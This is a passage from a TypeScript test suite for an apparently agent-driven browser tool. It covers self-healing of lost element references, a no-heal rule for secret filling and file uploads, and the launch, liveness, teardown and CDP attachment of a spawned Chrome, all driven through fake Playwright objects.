    };
    const candidate = {
      count: async () => 1,
      click: async (o?: { timeout?: number }) => {
        record.clicks.push(o);
      },
      waitFor: async (o?: { state?: string; timeout?: number }) => {
        record.waits.push(o);
      },
      evaluate: async (fn: (el: unknown, arg: unknown) => unknown, arg: unknown) => {
        const g = globalThis as Record<string, unknown>;
        const originalWindow = g.window;
        g.window = { getComputedStyle: () => ({ cursor: init?.cursor ?? "auto" }) };
        try {
          return fn(el, arg);
        } finally {
          if (originalWindow === undefined) delete g.window;
          else g.window = originalWindow;
        }
      }
    };
    return { candidate, record };
  }

  test("click self-heals a lost stamp via role/name/nth, restamps the survivor, and flags healedRef", async () => {
    const { candidate, record } = makeCandidate();
    const { page, calls, locatorOf } = makeHealPage({ roleCandidate: candidate });
    browserTest.installFakeSessionWithPageForTest("heal-click", page);
    const refs = new Map<string, unknown>();
    // Stamped locator matches nothing — the node was re-rendered away.
    refs.set("@e5", { locator: { count: async () => 0 }, role: "button", name: "Submit", nth: 1 });
    browserTest.setFakeSessionRefsForTest("heal-click", refs);

    const raw = await browserClick("heal-click", { ref: "@e5" });
    const parsed = JSON.parse(raw) as { success: boolean; healedRef?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.healedRef).toBe(true);
    // Re-query used the recorded role/name/nth, never the text fallback.
    expect(calls.getByRole.length).toBe(1);
    expect(calls.getByRole[0]!.role).toBe("button");
    expect(calls.getByRole[0]!.options).toEqual({ name: "Submit", exact: true });
    expect(calls.getByRole[0]!.nth).toBe(1);
    expect(calls.getByText.length).toBe(0);
    // The survivor was restamped with the SAME id, and the click ran
    // through the freshly-stamped selector (pinning the action to the
    // exact element that passed the heal checks) with the standard
    // timeout.
    expect(record.restamps).toEqual([{ attr: "data-gini-ref", id: "e5" }]);
    expect(calls.locator).toContain('[data-gini-ref="e5"]');
    const stamped = locatorOf('[data-gini-ref="e5"]');
    expect(stamped.clicks.length).toBe(1);
    expect(stamped.clicks[0]!.timeout).toBe(10_000);
    expect(record.clicks.length).toBe(0);
  });

  test("a live stamp resolves on the fast path without any re-query or healedRef flag", async () => {
    const clicks: Array<{ timeout?: number } | undefined> = [];
    const stamped = {
      count: async () => 1,
      click: async (o?: { timeout?: number }) => {
        clicks.push(o);
      }
    };
    const { page, calls } = makeHealPage({});
    browserTest.installFakeSessionWithPageForTest("heal-fast", page);
    const refs = new Map<string, unknown>();
    refs.set("@e5", { locator: stamped, role: "button", name: "Submit", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-fast", refs);

    const raw = await browserClick("heal-fast", { ref: "@e5" });
    const parsed = JSON.parse(raw) as { success: boolean; healedRef?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.healedRef).toBeUndefined();
    expect(clicks.length).toBe(1);
    expect(calls.getByRole.length).toBe(0);
    expect(calls.getByText.length).toBe(0);
  });

  test("no healing candidate yields the standard Unknown ref error", async () => {
    // Default candidates count 0: the role re-query finds nothing, and a
    // supported role with no match fails rather than guessing by text.
    const { page, calls } = makeHealPage({});
    browserTest.installFakeSessionWithPageForTest("heal-miss", page);
    const refs = new Map<string, unknown>();
    refs.set("@e7", { locator: { count: async () => 0 }, role: "button", name: "Gone", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-miss", refs);

    const raw = await browserClick("heal-miss", { ref: "@e7" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e7");
    expect(parsed.error).toContain("fresh snapshot");
    expect(calls.getByRole.length).toBe(1);
    expect(calls.getByText.length).toBe(0);
  });

  test("role clickable heals via exact-text matching, not getByRole", async () => {
    const { candidate } = makeCandidate({ cursor: "pointer" });
    const { page, calls, locatorOf } = makeHealPage({ textCandidate: candidate });
    browserTest.installFakeSessionWithPageForTest("heal-clickable", page);
    const refs = new Map<string, unknown>();
    refs.set("@e3", { locator: { count: async () => 0 }, role: "clickable", name: "Open card", nth: 2 });
    browserTest.setFakeSessionRefsForTest("heal-clickable", refs);

    const raw = await browserClick("heal-clickable", { ref: "@e3" });
    const parsed = JSON.parse(raw) as { success: boolean; healedRef?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.healedRef).toBe(true);
    expect(calls.getByRole.length).toBe(0);
    expect(calls.getByText.length).toBe(1);
    expect(calls.getByText[0]!.text).toBe("Open card");
    expect(calls.getByText[0]!.options).toEqual({ exact: true });
    expect(calls.getByText[0]!.nth).toBe(2);
    expect(locatorOf('[data-gini-ref="e3"]').clicks.length).toBe(1);
  });

  test("a candidate carrying a different stamp is never healed onto", async () => {
    // The re-query landed on a live element already addressed by another
    // ref; restamping it would fold two refs onto one node.
    const { candidate, record } = makeCandidate({ stamp: "e9" });
    const { page } = makeHealPage({ roleCandidate: candidate });
    browserTest.installFakeSessionWithPageForTest("heal-foreign", page);
    const refs = new Map<string, unknown>();
    refs.set("@e5", { locator: { count: async () => 0 }, role: "button", name: "Submit", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-foreign", refs);

    const raw = await browserClick("heal-foreign", { ref: "@e5" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e5");
    expect(record.clicks.length).toBe(0);
    expect(record.restamps.length).toBe(0);
  });

  test("a same-text bystander that is not cursor-interactive is never healed onto", async () => {
    // getByText also matches headings/spans containing the text; only an
    // element that would itself qualify as a walker clickable is trusted.
    const { candidate, record } = makeCandidate({ cursor: "auto" });
    const { page, calls } = makeHealPage({ textCandidate: candidate });
    browserTest.installFakeSessionWithPageForTest("heal-bystander", page);
    const refs = new Map<string, unknown>();
    refs.set("@e3", { locator: { count: async () => 0 }, role: "clickable", name: "Open card", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-bystander", refs);

    const raw = await browserClick("heal-bystander", { ref: "@e3" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e3");
    expect(calls.getByText.length).toBe(1);
    expect(record.clicks.length).toBe(0);
    expect(record.restamps.length).toBe(0);
  });

  test("an own-onclick text candidate qualifies without cursor:pointer", async () => {
    const { candidate } = makeCandidate({ onclick: true });
    const { page, locatorOf } = makeHealPage({ textCandidate: candidate });
    browserTest.installFakeSessionWithPageForTest("heal-onclick", page);
    const refs = new Map<string, unknown>();
    refs.set("@e3", { locator: { count: async () => 0 }, role: "clickable", name: "Open card", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-onclick", refs);

    const raw = await browserClick("heal-onclick", { ref: "@e3" });
    expect(JSON.parse(raw).success).toBe(true);
    expect(locatorOf('[data-gini-ref="e3"]').clicks.length).toBe(1);
  });

  test("wait_for state visible self-heals and flags healedRef", async () => {
    const { candidate } = makeCandidate();
    const { page, calls, locatorOf } = makeHealPage({ roleCandidate: candidate });
    browserTest.installFakeSessionWithPageForTest("heal-wait", page);
    const refs = new Map<string, unknown>();
    refs.set("@e4", { locator: { count: async () => 0 }, role: "status", name: "Saved", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-wait", refs);

    const raw = await browserWaitFor("heal-wait", { ref: "@e4", state: "visible" });
    const parsed = JSON.parse(raw) as { success: boolean; healedRef?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.healedRef).toBe(true);
    expect(calls.getByRole.length).toBe(1);
    const waits = locatorOf('[data-gini-ref="e4"]').waits;
    expect(waits.length).toBe(1);
    expect(waits[0]!.state).toBe("visible");
  });

  test("wait_for visible polls the stamped locator when resolution and healing both miss", async () => {
    // The element isn't there YET — waiting for it to appear is the
    // tool's whole contract, so a failed heal must not fail the call.
    const waits: Array<{ state?: string; timeout?: number } | undefined> = [];
    const stamped = {
      count: async () => 0,
      waitFor: async (o?: { state?: string; timeout?: number }) => {
        waits.push(o);
      }
    };
    const { page, calls } = makeHealPage({});
    browserTest.installFakeSessionWithPageForTest("heal-wait-poll", page);
    const refs = new Map<string, unknown>();
    refs.set("@e4", { locator: stamped, role: "status", name: "Saved", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-wait-poll", refs);

    const raw = await browserWaitFor("heal-wait-poll", { ref: "@e4", state: "visible" });
    const parsed = JSON.parse(raw) as { success: boolean; healedRef?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.healedRef).toBeUndefined();
    // Heal was attempted (role re-query ran) before falling back.
    expect(calls.getByRole.length).toBe(1);
    expect(waits.length).toBe(1);
    expect(waits[0]!.state).toBe("visible");
  });

  test("wait_for state hidden never heals — the raw stamped locator does the waiting", async () => {
    // A lost stamp often IS the disappearance being awaited; healing onto
    // a re-rendered replacement would invert the wait's meaning.
    let countCalls = 0;
    const waits: Array<{ state?: string; timeout?: number } | undefined> = [];
    const stamped = {
      count: async () => {
        countCalls += 1;
        return 0;
      },
      waitFor: async (o?: { state?: string; timeout?: number }) => {
        waits.push(o);
      }
    };
    const { page, calls } = makeHealPage({});
    browserTest.installFakeSessionWithPageForTest("heal-wait-hidden", page);
    const refs = new Map<string, unknown>();
    refs.set("@e4", { locator: stamped, role: "status", name: "Saved", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-wait-hidden", refs);

    const raw = await browserWaitFor("heal-wait-hidden", { ref: "@e4", state: "hidden" });
    const parsed = JSON.parse(raw) as { success: boolean; healedRef?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.healedRef).toBeUndefined();
    expect(waits.length).toBe(1);
    expect(waits[0]!.state).toBe("hidden");
    // No liveness probe, no re-query: the stamped locator was used as-is.
    expect(countCalls).toBe(0);
    expect(calls.getByRole.length).toBe(0);
    expect(calls.getByText.length).toBe(0);
  });

  test("fill_secrets never self-heals: a lost stamp fails loudly via the literal stamped selector", async () => {
    const { page, calls } = makeHealPage({});
    // The stamped node is gone, so the literal-selector fill times out
    // the way playwright would.
    (page as { locator?: unknown }).locator = (sel: string) => {
      calls.locator.push(sel);
      return {
        fill: async () => {
          throw new Error("Timeout 10000ms exceeded.");
        }
      };
    };
    browserTest.installFakeSessionWithPageForTest("heal-fill", page);
    // Healing metadata exists for the ref — and must NOT be consulted.
    const refs = new Map<string, unknown>();
    refs.set("@e5", { locator: { count: async () => 0 }, role: "textbox", name: "Password", nth: 0 });
    browserTest.setFakeSessionRefsForTest("heal-fill", refs);

    const result = await browserFillByLocator("heal-fill", { locator: "@e5", value: "sekrit-value-1234" });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.code).toBe("fill-error");
    // Resolution went through the literal stamped selector only — no
    // role/name re-query ever ran (trust boundary; see ADR
    // browser-fill-secret.md).
    expect(calls.locator).toEqual(['[data-gini-ref="e5"]']);
    expect(calls.getByRole.length).toBe(0);
    expect(calls.getByText.length).toBe(0);
  });

  test("upload never self-heals: acts only on the stamped element and fails loudly when detached", async () => {
    const HEAL_ROOT = "/tmp/gini-browser-heal-upload-tests";
    rmSync(HEAL_ROOT, { recursive: true, force: true });
    mkdirSync(HEAL_ROOT, { recursive: true });
    writeFileSync(join(HEAL_ROOT, "doc.txt"), "data\n");
    try {
      const { page, calls } = makeHealPage({});
      browserTest.installFakeSessionWithPageForTest("heal-upload", page);
      let setInputCalls = 0;
      const refs = new Map<string, unknown>();
      refs.set("@e2", {
        locator: {
          count: async () => 0,
          setInputFiles: async () => {
            setInputCalls += 1;
            throw new Error("Element is not attached to the DOM");
          }
        },
        role: "file",
        name: "Resume",
        nth: 0
      });
      browserTest.setFakeSessionRefsForTest("heal-upload", refs);

      const raw = await browserUploadFile("heal-upload", { ref: "@e2", path: "doc.txt" }, HEAL_ROOT);
      const parsed = JSON.parse(raw) as { success: boolean; error?: string };
      expect(parsed.success).toBe(false);
      expect(parsed.error).toContain("not attached");
      // The detached stamped element was the ONLY thing touched — no
      // role/name re-query (trust boundary; see ADR
      // browser-fill-secret.md).
      expect(setInputCalls).toBe(1);
      expect(calls.getByRole.length).toBe(0);
      expect(calls.getByText.length).toBe(0);
    } finally {
      rmSync(HEAL_ROOT, { recursive: true, force: true });
    }
  });
});

describe("chromeProfileDirFor", () => {
  test("derives the per-instance profile path from instance name", async () => {
    const { chromeProfileDirFor } = await import("./browser");
    const dir = chromeProfileDirFor("dev");
    expect(dir.endsWith("chrome-profile")).toBe(true);
    expect(dir.includes("dev")).toBe(true);
  });
});

// disconnectSharedBrowser must await any in-flight launch (pendingShared)
// before tearing down. A slow launchPersistentContext started just before
// disconnect can otherwise complete after the drain and install itself into
// `shared`, holding the profile lock against the Connect/Wipe that's running
// this teardown.
describe("disconnectSharedBrowser pending-launch handling", () => {
  afterEach(() => {
    browserTest.uninstallFakeBrowserForTest();
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    browserTest.clearPendingSharedForTest();
  });

  test("waits for an in-flight pendingShared launch and clears the resulting handle", async () => {
    // Build a pendingShared that resolves to a fake spawned context
    // AFTER disconnect has bumped the generation but before disconnect
    // has finished its drain. The natural ensureShared post-await
    // re-check would normally throw and tear down the freshly-built
    // handle, but we install pendingShared directly without going
    // through ensureShared so that re-check never runs. The disconnect
    // path itself must observe the leftover `shared` and tear it down.
    let contextCloseCalled = false;
    const fakeContext = {
      pages: () => [],
      close: async () => {
        contextCloseCalled = true;
      }
    };
    let resolvePending: (handle: unknown) => void = () => undefined;
    const pending = new Promise<unknown>((resolve) => {
      resolvePending = resolve;
    });
    browserTest.installPendingSharedForTest(pending as Promise<never>);

    // Kick off disconnect. It bumps the generation, increments
    // inFlightDisconnects, then enters the drain loop. pendingAdmissions
    // is 0, so the drain loop exits immediately. Then it should await
    // pendingShared and observe whatever the launch installs.
    const disconnectPromise = disconnectSharedBrowser();

    // Give disconnect a tick to enter the drain loop and reach the
    // pendingShared await.
    await new Promise((resolve) => setTimeout(resolve, 80));

    // Simulate a slow launch finishing AND installing itself into
    // shared. We have to do the install ourselves because the test
    // bypassed ensureShared's installer.
    browserTest.installFakeSpawnedHandleForTest(9410, fakeContext);
    resolvePending(fakeContext);

    await disconnectPromise;
    // The disconnect path must have observed the freshly-installed
    // shared handle and torn it down (closing the context).
    expect(contextCloseCalled).toBe(true);
  });
});

// isHandleAlive must force a relaunch when the underlying Chrome died out
// from under us. After an EXTERNAL kill (crash, or the user killing the
// spawned Chrome) Playwright's context.pages() still returns [] without
// throwing, so the old pages()-only probe reported the dead context as alive
// and wedged every later tool call on a stale handle. The Browser's
// isConnected() is the signal that actually flips on an external kill.
describe("isHandleAlive spawned liveness", () => {
  afterEach(() => {
    browserTest.uninstallFakeBrowserForTest();
  });

  test("reports dead when the spawned context's Browser disconnected", () => {
    browserTest.installFakeSpawnedHandleForTest(9420, {
      close: async () => undefined,
      pages: () => [],
      browser: () => ({ isConnected: () => false })
    });
    expect(browserTest.isSharedHandleAliveForTest()).toBe(false);
  });

  test("reports alive when the spawned context's Browser is connected", () => {
    browserTest.installFakeSpawnedHandleForTest(9421, {
      close: async () => undefined,
      pages: () => [],
      browser: () => ({ isConnected: () => true })
    });
    expect(browserTest.isSharedHandleAliveForTest()).toBe(true);
  });

  test("assumes alive when no Browser handle is exposed (cannot probe)", () => {
    browserTest.installFakeSpawnedHandleForTest(9422, {
      close: async () => undefined,
      pages: () => []
    });
    expect(browserTest.isSharedHandleAliveForTest()).toBe(true);
  });
});

// The no-record default tool path now acquires its browser via the SPAWNED
// provider (we launch our own branded Chrome on a free debug port and attach
// over CDP) against the per-instance profile dir. These tests swap the spawned
// provider with a fake so the default path is exercised without launching a
// real Chrome — the launch internals themselves are covered in
// chrome-launch.test.ts.
describe("spawned default browser launch", () => {
  function fakeSpawnedContext() {
    return {
      pages: () => [],
      newPage: async () => ({
        on: () => undefined,
        close: () => Promise.resolve(),
        goto: () => Promise.resolve(null),
        url: () => "about:blank",
        title: () => Promise.resolve(""),
        evaluate: () => Promise.resolve([])
      }),
      close: async () => undefined,
      browser: () => ({ isConnected: () => true })
    };
  }

  afterEach(() => {
    browserTest.setSessionProviderForTest("spawned", null);
    browserTest.uninstallFakeBrowserForTest();
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    browserTest.clearPendingSharedForTest();
  });

  test("routes the no-record default path through the spawned provider", async () => {
    let connectCalls = 0;
    browserTest.setSessionProviderForTest("spawned", {
      kind: "spawned",
      connect: async () => {
        connectCalls++;
        return {
          kind: "spawned",
          context: fakeSpawnedContext() as never,
          port: 9333,
          profileDir: "/tmp/fake-profile"
        };
      },
      disconnect: async () => undefined
    });

    try {
      // No record on this task, so the default path maps to the spawned
      // provider — it should be asked exactly once.
      await browserNavigate("spawned-default-task", { url: "https://example.com/" });
    } catch {
      // Snapshot wiring may throw on the fake page; the assertion is below.
    }

    expect(connectCalls).toBe(1);
  });

  test("drops a cached session whose browser was killed and relaunches via spawned provider", async () => {
    // Pre-install a session for this task whose context's Browser reports
    // disconnected (simulating an external kill after the session was made).
    browserTest.installFakeSessionWithPageAndContextForTest(
      "spawned-samekill-task",
      { url: () => "https://example.com/", close: () => Promise.resolve() } as never,
      { browser: () => ({ isConnected: () => false }) } as never
    );

    let connectCalls = 0;
    browserTest.setSessionProviderForTest("spawned", {
      kind: "spawned",
      connect: async () => {
        connectCalls++;
        return {
          kind: "spawned",
          context: fakeSpawnedContext() as never,
          port: 9333,
          profileDir: "/tmp/fake-profile"
        };
      },
      disconnect: async () => undefined
    });

    try {
      await browserNavigate("spawned-samekill-task", { url: "https://example.com/" });
    } catch {
      // Snapshot wiring may throw on the fake page; the assertion is the relaunch.
    }

    // The dead cached session was dropped, so the default path relaunched via
    // the spawned provider rather than handing back the dead session.
    expect(connectCalls).toBe(1);
  });
});

// Spawned launch internals: the real spawnedSessionProvider body, the
// per-instance profile-dir mapping, ensureShared's reuse/relaunch/generation
// guards, and teardown. The default (no-record) tool path routes through the
// spawned provider against the single per-instance shared slot. The
// spawn-and-attach launcher is swapped for a fake so no real Chrome is
// launched (the launcher itself is covered in chrome-launch.test.ts).
describe("spawned launch internals", () => {
  // A fake persistent context whose close() is observable and whose
  // browser().isConnected() drives liveness. `connected` can flip to simulate
  // an external kill.
  function fakeSpawnedResult(opts: { port?: number; connected?: () => boolean } = {}) {
    const close = mock(async () => undefined);
    const context = {
      pages: () => [],
      newPage: async () => ({
        on: () => undefined,
        close: () => Promise.resolve(),
        goto: () => Promise.resolve(null),
        url: () => "about:blank",
        title: () => Promise.resolve(""),
        evaluate: () => Promise.resolve([])
      }),
      close,
      browser: () => ({ isConnected: () => (opts.connected ? opts.connected() : true) })
    };
    const result = {
      context: context as never,
      port: opts.port ?? 9444,
      chromePath: "/fake/chrome",
      profileDir: "/tmp/fake-instance-profile"
    };
    return { result, close };
  }

  afterEach(async () => {
    await disconnectSharedBrowser().catch(() => undefined);
    browserTest.setSpawnChromeForTest(null);
    browserTest.uninstallFakeBrowserForTest();
    browserTest.clearFakeSessionsForTest();
    browserTest.clearPendingSharedForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    browserTest.resetBrowserInstanceForTest();
    // Remove the state root this test wrote so the fixed /tmp/gini-spawn-*
    // dirs don't accumulate as cruft (and don't collide across processes).
    const root = process.env["GINI_STATE_ROOT"];
    if (root) rmSync(root, { recursive: true, force: true });
    delete process.env["GINI_STATE_ROOT"];
  });

  test("spawnedProfileDir resolves the per-instance chrome-profile dir (not a per-agent dir)", () => {
    process.env["GINI_STATE_ROOT"] = "/tmp/gini-spawn-profiledir";
    setBrowserInstance("pd-inst");
    const dir = browserTest.spawnedProfileDirForTest();
    expect(dir).toContain("pd-inst");
    expect(dir).toContain("chrome-profile");
    expect(dir).not.toContain("agents");
  });

  test("spawnedProfileDir throws when no instance is registered", () => {
    browserTest.resetBrowserInstanceForTest();
    expect(() => browserTest.spawnedProfileDirForTest()).toThrow(/No instance registered/);
  });

  test("the default path launches via the spawned provider and closes the context on disconnect", async () => {
    process.env["GINI_STATE_ROOT"] = "/tmp/gini-spawn-provider";
    setBrowserInstance("sp-inst");
    const { result, close } = fakeSpawnedResult();
    const spawnFake = mock(async () => result);
    browserTest.setSpawnChromeForTest(spawnFake as never);

    // No state.browser record → spawned mode → ensureShared → spawned provider.
    try {
      await browserNavigate("sp-task", { url: "https://example.com/" });
    } catch {
      // Snapshot wiring may throw on the fake page; the launch is what's pinned.
    }
    expect(spawnFake).toHaveBeenCalledTimes(1);
    expect(browserTest.isSharedHandleAliveForTest()).toBe(true);
    // A second tool call on the live handle reuses it (no relaunch).
    try {
      await browserNavigate("sp-task-2", { url: "https://example.com/" });
    } catch {
      // ignore fake-page wiring throw
    }
    expect(spawnFake).toHaveBeenCalledTimes(1);

    // disconnectSharedBrowser tears down the spawned handle by closing its
    // persistent context (which terminates the launched Chrome).
    await disconnectSharedBrowser();
    expect(close).toHaveBeenCalled();
    expect(browserTest.isSharedHandleAliveForTest()).toBeNull();
  });

  test("ensureShared relaunches when the cached spawned handle's context is disconnected", async () => {
    process.env["GINI_STATE_ROOT"] = "/tmp/gini-spawn-relaunch";
    setBrowserInstance("relaunch-inst");
    let connected = true;
    const spawnFake = mock(async () => fakeSpawnedResult({ connected: () => connected }).result);
    browserTest.setSpawnChromeForTest(spawnFake as never);

    try {
      await browserNavigate("relaunch-task", { url: "https://example.com/" });
    } catch {
      // ignore fake-page wiring throw
    }
    expect(spawnFake).toHaveBeenCalledTimes(1);
    // The Chrome dies; the next tool call drops the dead handle and relaunches.
    connected = false;
    try {
      await browserNavigate("relaunch-task-2", { url: "https://example.com/" });
    } catch {
      // ignore fake-page wiring throw
    }
    expect(spawnFake).toHaveBeenCalledTimes(2);
    await closeAll();
    expect(browserTest.isSharedHandleAliveForTest()).toBeNull();
  });

  test("ensureShared bails and tears down the spawned handle when a disconnect lands mid-launch", async () => {
    process.env["GINI_STATE_ROOT"] = "/tmp/gini-spawn-genrace";
    setBrowserInstance("genrace-inst");
    const { result, close } = fakeSpawnedResult();
    const spawnFake = mock(async () => {
      // Simulate a disconnect completing while the launch is in flight.
      browserTest.bumpDisconnectGenerationForTest();
      return result;
    });
    browserTest.setSpawnChromeForTest(spawnFake as never);

    const navResult = await browserNavigate("genrace-task", { url: "https://example.com/" });
    const parsed = JSON.parse(navResult) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/disconnecting/i);
    // The freshly-built handle was torn down (context closed) and never installed.
    expect(close).toHaveBeenCalled();
    expect(browserTest.isSharedHandleAliveForTest()).toBeNull();
  });

  test("ensureShared wraps a spawned launch failure with a friendly message", async () => {
    process.env["GINI_STATE_ROOT"] = "/tmp/gini-spawn-fail";
    setBrowserInstance("fail-inst");
    browserTest.setSpawnChromeForTest((async () => {
      throw new Error("chrome go boom");
    }) as never);
    const navResult = await browserNavigate("fail-task", { url: "https://example.com/" });
    const parsed = JSON.parse(navResult) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/Failed to launch Chromium: chrome go boom/);
  });

  test("disconnectSharedBrowser drains an in-flight spawned launch before teardown", async () => {
    process.env["GINI_STATE_ROOT"] = "/tmp/gini-spawn-drain";
    setBrowserInstance("drain-inst");
    const { result } = fakeSpawnedResult();
    let releaseLaunch: () => void = () => undefined;
    const gate = new Promise<void>((resolve) => {
      releaseLaunch = resolve;
    });
    browserTest.setSpawnChromeForTest((async () => {
      await gate;
      return result;
    }) as never);

    // Start a launch and leave it suspended at the gate.
    const launching = browserNavigate("drain-task", { url: "https://example.com/" });
    await new Promise((r) => setImmediate(r));
    // Disconnect runs concurrently; its pendingShared drain must await the
    // in-flight launch (which we now release).
    const disconnecting = disconnectSharedBrowser();
    await new Promise((r) => setImmediate(r));
    releaseLaunch();
    await Promise.all([launching.catch(() => undefined), disconnecting]);
    // The drained launch's handle was torn down, leaving no shared handle.
    expect(browserTest.isSharedHandleAliveForTest()).toBeNull();
  });

  test("a wedged spawned context close reaps the instance's Chrome by its profile dir", async () => {
    process.env["GINI_STATE_ROOT"] = "/tmp/gini-spawn-wedged";
    setBrowserInstance("wedged-inst");
    // A context whose close() never resolves, so teardown hits the timeout
    // branch and falls back to the profile-dir reaper.
    const neverCloses = {
      pages: () => [],
      newPage: async () => ({
        on: () => undefined,
        close: () => Promise.resolve(),
        goto: () => Promise.resolve(null),
        url: () => "about:blank",
        title: () => Promise.resolve(""),
        evaluate: () => Promise.resolve([])
      }),
      close: () => new Promise<void>(() => undefined),
      browser: () => ({ isConnected: () => true })
    };
    browserTest.setSpawnChromeForTest((async () => ({
      context: neverCloses as never,
      port: 9444
    })) as never);
    browserTest.setTeardownCloseTimeoutForTest(20);
    const killer = mock((_dir: string) => 1);
    browserTest.setChromeKillerForTest(killer);
    try {
      try {
        await browserNavigate("wedged-task", { url: "https://example.com/" });
      } catch {
        // ignore fake-page wiring throw
      }
      await disconnectSharedBrowser();
      // The wedged close timed out, so the profile-dir reaper fired against
      // THIS instance's chrome-profile dir (never killall, never agents/).
      expect(killer).toHaveBeenCalledTimes(1);
      const reapedDir = killer.mock.calls[0]![0]!;
      expect(reapedDir).toContain("chrome-profile");
      expect(reapedDir).not.toContain("agents");
      expect(browserTest.isSharedHandleAliveForTest()).toBeNull();
    } finally {
      browserTest.resetTeardownCloseTimeoutForTest();
      browserTest.resetChromeKillerForTest();
    }
  });

  test("closeAll drains a live session's owned pages then clears the spawned handle", async () => {
    process.env["GINI_STATE_ROOT"] = "/tmp/gini-spawn-closeall";
    setBrowserInstance("closeall-inst");
    // Seed the spawned handle so closeAll's teardown loop runs against a real
    // entry. Driving a navigate with no record routes through ensureShared →
    // the spawned provider, installing the fake context into the shared slot.
    const { result, close } = fakeSpawnedResult();
    browserTest.setSpawnChromeForTest((async () => result) as never);
    const pageClose = mock(() => Promise.resolve());
    // Pre-install a live session with an agent-owned page so closeAll's
    // ownedPageIds drain loop runs against a real entry.
    browserTest.installFakeSessionWithPageForTest("closeall-task", {
      url: () => "about:blank",
      close: pageClose
    } as never);
    try {
      await browserNavigate("closeall-task-2", { url: "https://example.com/" });
    } catch {
      // ignore fake-page wiring throw
    }
    expect(browserTest.isSharedHandleAliveForTest()).toBe(true);

    await closeAll();
    expect(pageClose).toHaveBeenCalled();
    expect(close).toHaveBeenCalled();
    expect(browserTest.isSharedHandleAliveForTest()).toBeNull();
  });
});

// The spawned provider refuses to acquire a browser when no runtime instance
// has been registered (so the launch can't target an unknown profile dir).
// Drives the provider's connect() directly through the seam.
describe("spawned provider no-instance refusal", () => {
  afterEach(() => {
    browserTest.setSessionProviderForTest("spawned", null);
    browserTest.resetBrowserInstanceForTest();
  });

  test("connect() throws the no-instance error when no instance is registered", async () => {
    browserTest.resetBrowserInstanceForTest();
    await expect(browserTest.connectProviderForTest("spawned")).rejects.toThrow(
      /No instance registered/
    );
  });
});

// CDP provider body: a persisted cdp record makes ensureShared attach to the
// user's external Chrome over connectOverCDP instead of spawning. We stub
// playwright-core so no real Chrome is needed; the attach URL + the friendly
// hang hint on failure are what's pinned.
describe("cdp provider body", () => {
  const CDP_TEST_ROOT = "/tmp/gini-browser-cdp-tests";

  afterEach(async () => {
    await disconnectSharedBrowser().catch(() => undefined);
    browserTest.uninstallFakeBrowserForTest();
    browserTest.clearFakeSessionsForTest();
    browserTest.clearPendingSharedForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    browserTest.resetChromiumImportForTest();
    browserTest.resetBrowserInstanceForTest();
    mock.restore();
  });

  test("a cdp record attaches via connectOverCDP and reuses the first context", async () => {
    process.env["GINI_STATE_ROOT"] = CDP_TEST_ROOT;
    const instance = `cdp-${process.pid}`;
    rmSync(`${CDP_TEST_ROOT}/instances/${instance}`, { recursive: true, force: true });
    setBrowserInstance(instance);
    await mutateState(instance, (state) => {
      state.browser = {
        mode: "cdp",
        cdpUrl: "ws://127.0.0.1:9322/devtools/browser/abc",
        startedAt: new Date().toISOString()
      };
    });

    let connectUrl: string | undefined;
    const reusedContext = {
      pages: () => [],
      newPage: async () => ({
        on: () => undefined,
        close: () => Promise.resolve(),
        goto: () => Promise.resolve(null),
        url: () => "about:blank",
        title: () => Promise.resolve(""),
        evaluate: () => Promise.resolve([])
      }),
      close: async () => undefined,
      browser: () => ({ isConnected: () => true })
    };
    mock.module("playwright-core", () => ({
      chromium: {
        connectOverCDP: async (url: string) => {
          connectUrl = url;
          return {
            isConnected: () => true,
            contexts: () => [reusedContext],
            disconnect: async () => undefined
          };
        }
      }
    }));
    browserTest.resetChromiumImportForTest();

    try {
      await browserNavigate("cdp-task", { url: "https://example.com/" });
    } catch {
      // Snapshot wiring may throw on the fake context; the attach is pinned.
    }
    expect(connectUrl).toBe("ws://127.0.0.1:9322/devtools/browser/abc");
  });

  test("a cdp attach failure surfaces the friendly hang hint", async () => {
    process.env["GINI_STATE_ROOT"] = CDP_TEST_ROOT;
    const instance = `cdp-fail-${process.pid}`;
    rmSync(`${CDP_TEST_ROOT}/instances/${instance}`, { recursive: true, force: true });
    setBrowserInstance(instance);
    await mutateState(instance, (state) => {
      state.browser = {
        mode: "cdp",
        cdpUrl: "ws://127.0.0.1:9323/devtools/browser/def",
        startedAt: new Date().toISOString()
      };
    });
    mock.module("playwright-core", () => ({
      chromium: {
        connectOverCDP: async () => {
          throw new Error("websocket connection closed");
        }
      }
    }));
    browserTest.resetChromiumImportForTest();

    const result = await browserNavigate("cdp-fail-task", { url: "https://example.com/" });
    const parsed = JSON.parse(result) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/attach over CDP/i);
  });

  test("connectProviderForTest('cdp') with no cdpUrl throws the reconnect hint", async () => {
    mock.module("playwright-core", () => ({
      chromium: { connectOverCDP: async () => ({ isConnected: () => true, contexts: () => [], disconnect: async () => undefined }) }
    }));
